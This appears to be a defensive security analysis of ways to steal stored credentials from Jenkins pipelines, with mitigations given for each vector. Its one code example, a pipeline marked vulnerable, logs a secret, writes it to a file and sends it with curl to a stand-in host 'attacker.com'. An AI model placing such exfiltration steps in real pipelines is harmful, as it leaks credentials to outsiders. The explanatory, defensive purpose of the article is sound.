## Deep Analysis of "Retrieve Stored Credentials" Attack Path in Jenkins Pipeline Model Definition Plugin

This analysis focuses on the attack path "Retrieve Stored Credentials" within a Jenkins environment utilizing the Pipeline Model Definition Plugin. We will break down potential methods an attacker could employ, considering the specific features and potential vulnerabilities associated with this plugin.

**Attack Tree Path: Retrieve Stored Credentials**

**Significance:** Accessing stored credentials within Jenkins provides the attacker with sensitive information that can be used to compromise other systems and accounts. This is a key step in lateral movement and data breaches.

**Detailed Breakdown of Potential Attack Vectors:**

Here's a breakdown of how an attacker might achieve "Retrieve Stored Credentials" within a Jenkins environment using the Pipeline Model Definition Plugin:

**1. Exploiting Pipeline Definition Vulnerabilities:**

* **1.1. Insecure Use of `credentials()` function:**
    * **Description:** The Pipeline Model Definition Plugin provides the `credentials()` function to access stored credentials within pipelines. If this function is used insecurely, it can expose credentials.
    * **Attack Scenario:**
        * An attacker with the ability to modify or create pipelines (e.g., through compromised developer accounts or lack of access controls) can craft a pipeline that logs or transmits the retrieved credential value.
        * They might use the `credentials()` function to retrieve a credential and then echo it to the build log, a file accessible within the workspace, or send it to an external server.
    * **Example Pipeline Code (Vulnerable):**
      ```groovy
      pipeline {
          agent any
          stages {
              stage('Retrieve Credential') {
                  steps {
                      script {
                          def myCred = credentials('my-secret-credential')
                          echo "Retrieved credential: ${myCred}" // Vulnerable: Logs the secret
                          writeFile file: 'secret.txt', text: "${myCred}" // Vulnerable: Writes secret to file
                          sh "curl -X POST -d 'secret=${myCred}' http://attacker.com/receive_secret" // Vulnerable: Sends secret externally
                      }
                  }
              }
          }
      }
      ```
    * **Prerequisites:** Ability to create or modify pipeline definitions.
    * **Mitigation:**
        * **Principle of Least Privilege:** Restrict who can create and modify pipelines.
        * **Secure Coding Practices:** Educate developers on the dangers of directly logging or transmitting credential values.
        * **Secret Masking:** Jenkins offers features to mask sensitive information in build logs. Utilize this.
        * **Static Analysis:** Employ tools to scan pipeline definitions for potential credential leaks.

* **1.2. Exploiting Script Security Bypass:**
    * **Description:** While the Pipeline Model Definition Plugin aims to provide a structured way to define pipelines, vulnerabilities in the underlying Groovy scripting engine or the plugin itself could allow attackers to bypass security restrictions and execute arbitrary code.
    * **Attack Scenario:**
        * An attacker might find a way to inject malicious Groovy code within a pipeline definition that circumvents the intended security sandbox.
        * This could allow them to directly access Jenkins internal objects or the underlying operating system to retrieve credential data.
    * **Prerequisites:** Vulnerability in the plugin or Groovy scripting engine. Ability to create or modify pipeline definitions.
    * **Mitigation:**
        * **Keep Jenkins and Plugins Updated:** Regularly update Jenkins and all plugins, including the Pipeline Model Definition Plugin, to patch known vulnerabilities.
        * **Restrict Script Permissions:**  Configure Jenkins to restrict the permissions available to pipeline scripts.
        * **Security Audits:** Regularly conduct security audits of Jenkins and its plugins.

* **1.3. Manipulating Input Parameters:**
    * **Description:** If pipeline definitions accept user-controlled input that is not properly sanitized, an attacker might be able to inject malicious code that retrieves credentials.
    * **Attack Scenario:**
        * A pipeline might take a credential ID as a parameter. An attacker could try to inject code into this parameter that, when processed by the `credentials()` function or other parts of the pipeline, leads to credential disclosure.
    * **Example (Conceptual):** Imagine a flawed implementation where the credential ID is directly used in a Groovy expression without proper escaping.
    * **Prerequisites:** Pipeline with vulnerable input handling. Ability to trigger the pipeline with malicious input.
    * **Mitigation:**
        * **Input Validation and Sanitization:**  Thoroughly validate and sanitize all user-provided input before using it in pipeline logic.
        * **Avoid Dynamic Credential ID Resolution:**  Minimize the use of dynamically determined credential IDs based on user input.

**2. Leveraging Access Control Issues:**

* **2.1. Insufficient Role-Based Access Control (RBAC):**
    * **Description:** If Jenkins RBAC is not properly configured, users with overly broad permissions might be able to access and view stored credentials through the Jenkins UI or API.
    * **Attack Scenario:**
        * An attacker might compromise an account with excessive permissions, allowing them to navigate to the "Credentials" section in Jenkins and view the stored secrets.
        * They could also use the Jenkins API with the compromised account to retrieve credential details.
    * **Prerequisites:** Compromised account with excessive permissions.
    * **Mitigation:**
        * **Implement Fine-Grained RBAC:**  Configure Jenkins RBAC to grant users only the necessary permissions for their tasks. Follow the principle of least privilege.
        * **Regularly Review Permissions:** Periodically review and audit user permissions to ensure they are still appropriate.

* **2.2. API Token Exploitation:**
    * **Description:** Jenkins API tokens provide programmatic access. If these tokens are compromised or have excessive permissions, they can be used to retrieve credentials.
    * **Attack Scenario:**
        * An attacker might obtain a valid API token (e.g., through phishing or by exploiting a vulnerability).
        * They can then use this token to make API calls to retrieve credential information.
    * **Prerequisites:** Compromised API token with sufficient permissions.
    * **Mitigation:**
        * **Secure Storage of API Tokens:**  Educate users on the importance of securely storing API tokens.
        * **Token Revocation:**  Implement processes for revoking compromised API tokens.
        * **Minimize Token Permissions:**  Grant API tokens only the necessary permissions.

**3. Exploiting Underlying System Vulnerabilities:**

* **3.1. Accessing the Jenkins Master Filesystem:**
    * **Description:** In some configurations, credentials might be stored in files on the Jenkins master server. If an attacker gains access to the filesystem, they could potentially retrieve these files.
    * **Attack Scenario:**
        * An attacker might exploit an operating system vulnerability or gain unauthorized access to the Jenkins master server.
        * They could then navigate the filesystem and locate files containing credential information (e.g., backup files, misconfigured configuration files).
    * **Prerequisites:** Access to the Jenkins master server filesystem.
    * **Mitigation:**
        * **Harden the Jenkins Master Server:**  Implement strong security measures on the Jenkins master server, including regular patching, strong passwords, and restricted access.
        * **Encrypt Sensitive Data at Rest:**  Encrypt sensitive data stored on the Jenkins master filesystem.

* **3.2. Memory Dumping:**
    * **Description:** If an attacker gains sufficient access to the Jenkins master process, they might be able to dump the memory and potentially extract credential information stored in memory.
    * **Attack Scenario:**
        * An attacker might exploit a vulnerability allowing them to execute code on the Jenkins master or gain access to the process memory.
        * They could then use tools to dump the memory and search for sensitive data, including credentials.
    * **Prerequisites:** High-level access to the Jenkins master process.
    * **Mitigation:**
        * **Secure the Jenkins Master Process:** Implement security measures to protect the Jenkins master process from unauthorized access and manipulation.
        * **Regularly Restart Jenkins:**  Restarting Jenkins can help clear sensitive data from memory.

**Impact of Successful Credential Retrieval:**

Successfully retrieving stored credentials can have significant consequences, including:

* **Lateral Movement:**  Using the retrieved credentials to access other systems and resources within the organization's network.
* **Data Breaches:** Accessing sensitive data stored in systems protected by the compromised credentials.
* **Account Takeovers:**  Using the credentials to impersonate legitimate users and gain unauthorized access to applications and services.
* **System Compromise:**  Using privileged credentials to gain control over critical infrastructure.

**Conclusion:**

The "Retrieve Stored Credentials" attack path is a critical security concern in Jenkins environments utilizing the Pipeline Model Definition Plugin. Understanding the various attack vectors, from insecure pipeline definitions to access control weaknesses and underlying system vulnerabilities, is crucial for implementing effective security measures. A layered security approach, combining secure coding practices, robust access controls, regular updates, and proactive monitoring, is essential to mitigate the risk of credential compromise. Specifically regarding the Pipeline Model Definition Plugin, careful consideration should be given to the secure usage of the `credentials()` function and the potential for script security bypasses.
